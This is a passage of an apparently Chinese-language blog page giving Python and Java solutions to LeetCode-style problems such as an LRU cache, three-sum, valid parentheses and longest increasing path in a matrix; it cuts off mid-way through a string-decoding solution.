class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span>(<span class="params">self,nums,left,right,target</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(left &gt; right):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        mid = (left + right)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &lt; target):</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">            idx = self.search(nums,left,right,target)</span><br><span class="line">        <span class="keyword">elif</span>(nums[mid] &gt; target):</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">            idx = self.search(nums,left,right,target)</span><br><span class="line">        <span class="keyword">elif</span>(nums[mid] == target):</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchRange</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        res = []</span><br><span class="line">        idx = self.search(nums,<span class="number">0</span>,<span class="built_in">len</span>(nums)-<span class="number">1</span>,target)</span><br><span class="line">        <span class="keyword">if</span>(idx == <span class="literal">None</span>):</span><br><span class="line">            res = [-<span class="number">1</span>,-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = idx - <span class="number">1</span></span><br><span class="line">            right = idx + <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span>(left &gt;= <span class="number">0</span> <span class="keyword">and</span> nums[left] == target):</span><br><span class="line">                left -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span>(right &lt; <span class="built_in">len</span>(nums) <span class="keyword">and</span> nums[right] == target):</span><br><span class="line">                right += <span class="number">1</span></span><br><span class="line">            res = [left+<span class="number">1</span>,right-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>






        <h2 id="LRU缓存Least-Recently-Used"   >
          <a href="#LRU缓存Least-Recently-Used" class="heading-link"><i class="fas fa-link"></i></a><a href="#LRU缓存Least-Recently-Used" class="headerlink" title="LRU缓存Least Recently Used)"></a>LRU缓存Least Recently Used)</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221002153031254.png" alt="image-20221002153031254"></p>
<ul>
<li><p>使用哈希表<code>HashMap</code>来完成<code>key</code>的唯一性</p>
</li>
<li><p>使用双向链表来完成<code>put</code>和<code>get</code>的时间复杂度要求，以及头部为最近使用的，尾部为最不常使用的</p>
</li>
<li><p>要记得删除节点和更新节点的时候，都要更新hash表</p>
</li>
</ul>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DLinkedNode</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> key;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> value;</span><br><span class="line">        <span class="keyword">private</span> DLinkedNode next;</span><br><span class="line">        <span class="keyword">private</span> DLinkedNode prev;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DLinkedNode</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DLinkedNode</span><span class="params">(<span class="keyword">int</span> _key, <span class="keyword">int</span> _value)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.key = _key;</span><br><span class="line">            <span class="keyword">this</span>.value = _value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer,DLinkedNode&gt; cache;</span><br><span class="line">    <span class="keyword">private</span> DLinkedNode head;</span><br><span class="line">    <span class="keyword">private</span> DLinkedNode tail;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">        <span class="keyword">this</span>.head = <span class="keyword">new</span> DLinkedNode();</span><br><span class="line">        <span class="keyword">this</span>.tail = <span class="keyword">new</span> DLinkedNode();</span><br><span class="line">        <span class="keyword">this</span>.head.next = <span class="keyword">this</span>.tail;</span><br><span class="line">        <span class="keyword">this</span>.tail.prev = <span class="keyword">this</span>.head;</span><br><span class="line">        <span class="keyword">this</span>.cache = <span class="keyword">new</span> HashMap&lt;Integer,DLinkedNode&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">        DLinkedNode node = <span class="keyword">this</span>.cache.get(key);</span><br><span class="line">        <span class="comment">//如果不存在key,则直接放入头部</span></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            DLinkedNode newNode = <span class="keyword">new</span> DLinkedNode(key,value);</span><br><span class="line">            addToHead(newNode);</span><br><span class="line">            <span class="keyword">this</span>.cache.put(key,newNode);</span><br><span class="line">            size ++;</span><br><span class="line">            <span class="comment">//超出容量，删除末尾的节点,更新hash表</span></span><br><span class="line">            <span class="keyword">if</span>(size &gt; capacity)&#123;</span><br><span class="line">                DLinkedNode needRmNode = <span class="keyword">this</span>.tail.prev;</span><br><span class="line">                removeNode(needRmNode);</span><br><span class="line">                <span class="keyword">this</span>.cache.remove(needRmNode.key);</span><br><span class="line">                size --;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//存在key的话,就修改value,更新hash表,并且放入头部</span></span><br><span class="line">            node.value = value;</span><br><span class="line">            <span class="comment">//this.cache.put(key,node);</span></span><br><span class="line">            moveToHead(node);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        DLinkedNode node = <span class="keyword">this</span>.cache.get(key);</span><br><span class="line">        <span class="comment">//不存在该结点</span></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//需要放入移动到头部</span></span><br><span class="line">            moveToHead(node);</span><br><span class="line">            <span class="keyword">return</span> node.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addToHead</span><span class="params">(DLinkedNode node)</span></span>&#123;</span><br><span class="line">        node.next = <span class="keyword">this</span>.head.next;</span><br><span class="line">        node.prev = <span class="keyword">this</span>.head;</span><br><span class="line">        <span class="keyword">this</span>.head.next.prev = node;</span><br><span class="line">        <span class="keyword">this</span>.head.next = node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeNode</span><span class="params">(DLinkedNode node)</span></span>&#123;</span><br><span class="line">        node.prev.next = node.next;</span><br><span class="line">        node.next.prev = node.prev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveToHead</span><span class="params">(DLinkedNode node)</span></span>&#123;</span><br><span class="line">        removeNode(node);</span><br><span class="line">        addToHead(node);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h2 id="有效括号"   >
          <a href="#有效括号" class="heading-link"><i class="fas fa-link"></i></a><a href="#有效括号" class="headerlink" title="有效括号"></a>有效括号</h2>
      <p>利用栈匹配即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">        <span class="built_in">dict</span> = &#123;</span><br><span class="line">            <span class="string">&quot;(&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;[&quot;</span>:<span class="string">&quot;]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&#123;&quot;</span>:<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        stack = []</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">chr</span> <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">chr</span> <span class="keyword">in</span> <span class="built_in">dict</span>):</span><br><span class="line">                stack.append(<span class="built_in">chr</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(stack) &gt; <span class="number">0</span>):</span><br><span class="line">                    top = stack.pop()</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">dict</span>[top] == <span class="built_in">chr</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(stack) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="买卖股票的最佳时机"   >
          <a href="#买卖股票的最佳时机" class="heading-link"><i class="fas fa-link"></i></a><a href="#买卖股票的最佳时机" class="headerlink" title="买卖股票的最佳时机"></a>买卖股票的最佳时机</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221005144848588.png" alt="image-20221005144848588"></p>
<p>一次遍历，找出当前阶段价格最小的一天然后进行计算利益替换最大利益</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        maxProfit = <span class="number">0</span></span><br><span class="line">        minDay = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(prices)):</span><br><span class="line">            <span class="keyword">if</span>(prices[i] &lt; prices[minDay]):</span><br><span class="line">                minDay = i</span><br><span class="line">            <span class="keyword">elif</span>(prices[i] - prices[minDay] &gt; maxProfit):</span><br><span class="line">                maxProfit = prices[i] - prices[minDay]</span><br><span class="line">        <span class="keyword">return</span> maxProfit</span><br></pre></td></tr></table></div></figure>




        <h2 id="三数之和"   >
          <a href="#三数之和" class="heading-link"><i class="fas fa-link"></i></a><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h2>
      <p>快排加双指针</p>
<p>定位一个位置，然后一步步逼近</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/3sum/solution/3sumpai-xu-shuang-zhi-zhen-yi-dong-by-jyd/" >三数之和（排序+双指针，易懂图解） - 三数之和 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221006151523738.png" alt="image-20221006151523738"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSum</span>(<span class="params">self, nums: [<span class="built_in">int</span>]</span>) -&gt; [[<span class="built_in">int</span>]]:</span></span><br><span class="line">        self.quickStart(nums)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(nums)-<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span>(nums[k] &gt; <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(k &gt; <span class="number">0</span> <span class="keyword">and</span> nums[k-<span class="number">1</span>]==nums[k]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            j = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">            i = k + <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span>(i &lt; j):</span><br><span class="line">                s = nums[k] + nums[i] + nums[j]</span><br><span class="line">                <span class="keyword">if</span>(s &lt; <span class="number">0</span>):</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span>(i &lt; j <span class="keyword">and</span> nums[i] == nums[i-<span class="number">1</span>]):</span><br><span class="line">                        i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span>(s &gt; <span class="number">0</span>):</span><br><span class="line">                    j -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span>(i &lt; j <span class="keyword">and</span> nums[j] == nums[j+<span class="number">1</span>]):</span><br><span class="line">                        j -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res.append([nums[k],nums[i],nums[j]])</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                    j -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> i &lt; j <span class="keyword">and</span> nums[i] == nums[i - <span class="number">1</span>]: i += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> i &lt; j <span class="keyword">and</span> nums[j] == nums[j + <span class="number">1</span>]: j -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partition</span>(<span class="params">self,nums,low,high</span>):</span></span><br><span class="line">        pivot_idx = random.randint(low,high)</span><br><span class="line">        pivot = nums[pivot_idx]</span><br><span class="line">        nums[low],nums[pivot_idx] = nums[pivot_idx],nums[low]</span><br><span class="line">        left = low</span><br><span class="line">        right = high</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> pivot &lt;= nums[right]):</span><br><span class="line">                right -= <span class="number">1</span></span><br><span class="line">            nums[left] = nums[right]</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> pivot &gt;= nums[left]):</span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">            nums[right] = nums[left]</span><br><span class="line">        nums[left] = pivot</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quickSort</span>(<span class="params">self,nums,low,high</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(low &gt;= high):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mid = self.partition(nums,low,high)</span><br><span class="line">        self.quickSort(nums,low,mid - <span class="number">1</span>)</span><br><span class="line">        self.quickSort(nums,mid + <span class="number">1</span> , high)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quickStart</span>(<span class="params">self,nums</span>):</span></span><br><span class="line">        self.quickSort(nums,<span class="number">0</span>,<span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>




        <h2 id="不规则正方体表面积"   >
          <a href="#不规则正方体表面积" class="heading-link"><i class="fas fa-link"></i></a><a href="#不规则正方体表面积" class="headerlink" title="不规则正方体表面积"></a>不规则正方体表面积</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221007145633433.png" alt="image-20221007145633433"></p>
<p>计算所有表面积减去重叠表面积</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">surfaceArea</span>(<span class="params">self, grid: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        full = <span class="number">0</span></span><br><span class="line">        overlap = <span class="number">0</span></span><br><span class="line">        myLen = <span class="built_in">len</span>(grid[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,myLen):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,myLen):</span><br><span class="line">                leftOver, topOver, rightOver, downOver = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">                full += <span class="number">1</span> * grid[i][j] * <span class="number">4</span> + <span class="number">1</span>*<span class="number">2</span>*(<span class="number">1</span> <span class="keyword">if</span> grid[i][j] &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">if</span>(i - <span class="number">1</span> &gt;= <span class="number">0</span>):</span><br><span class="line">                    topOver = <span class="built_in">min</span>(grid[i][j],grid[i-<span class="number">1</span>][j])*<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(j - <span class="number">1</span> &gt;= <span class="number">0</span>):</span><br><span class="line">                    leftOver = <span class="built_in">min</span>(grid[i][j],grid[i][j-<span class="number">1</span>])*<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(i + <span class="number">1</span> &lt; myLen):</span><br><span class="line">                    downOver = <span class="built_in">min</span>(grid[i][j],grid[i+<span class="number">1</span>][j])*<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(j + <span class="number">1</span> &lt; myLen):</span><br><span class="line">                    rightOver = <span class="built_in">min</span>(grid[i][j],grid[i][j+<span class="number">1</span>])*<span class="number">1</span></span><br><span class="line">                tmplap = leftOver + topOver + rightOver + downOver</span><br><span class="line">                overlap += tmplap</span><br><span class="line">        <span class="keyword">return</span> full - overlap</span><br></pre></td></tr></table></div></figure>


        <h2 id="矩阵中的最长递增路径"   >
          <a href="#矩阵中的最长递增路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#矩阵中的最长递增路径" class="headerlink" title="矩阵中的最长递增路径"></a>矩阵中的最长递增路径</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221007201543937.png" alt="image-20221007201543937"></p>
<p>深度优先搜索加缓存，保证不重复遍历</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[][] direction = &#123;&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> rowLens;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> columnLens;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestIncreasingPath</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.rowLens = matrix.length;</span><br><span class="line">        <span class="keyword">this</span>.columnLens = matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span>[][] mem = <span class="keyword">new</span> <span class="keyword">int</span>[rowLens][columnLens];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> row = <span class="number">0</span> ; row &lt; rowLens ; row++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> column = <span class="number">0</span> ; column &lt; columnLens ; column++)&#123;</span><br><span class="line">                result = Math.max(result,dfs(matrix,mem,row,column));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span>[][] matrix,<span class="keyword">int</span>[][] mem,<span class="keyword">int</span> row,<span class="keyword">int</span> column)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(mem[row][column] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> mem[row][column];</span><br><span class="line">        &#125;</span><br><span class="line">        mem[row][column] += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="keyword">this</span>.direction.length ; i ++)&#123;</span><br><span class="line">            <span class="keyword">int</span> newRow = row + <span class="keyword">this</span>.direction[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> newColumn = column + <span class="keyword">this</span>.direction[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span> &lt;= newColumn &amp;&amp;  newColumn &lt; <span class="keyword">this</span>.columnLens &amp;&amp; <span class="number">0</span> &lt;= newRow &amp;&amp;  newRow &lt; <span class="keyword">this</span>.rowLens &amp;&amp; matrix[newRow][newColumn] &gt; matrix[row][column])&#123;</span><br><span class="line">                mem[row][column] = Math.max(mem[row][column],dfs(matrix,mem,newRow,newColumn) + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> mem[row][column];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>






        <h2 id="字符串解码"   >
          <a href="#字符串解码" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符串解码" class="headerlink" title="字符串解码"></a>字符串解码</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221010141129667.png" alt="image-20221010141129667"></p>
<p>利用栈即可实现</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decodeString</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        res = <span class="string">&quot;&quot;</span></span><br><span class="line">        stack = []</span><br><span class="line">        pushList = <span class="string">&quot;0123456789[abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">        <span 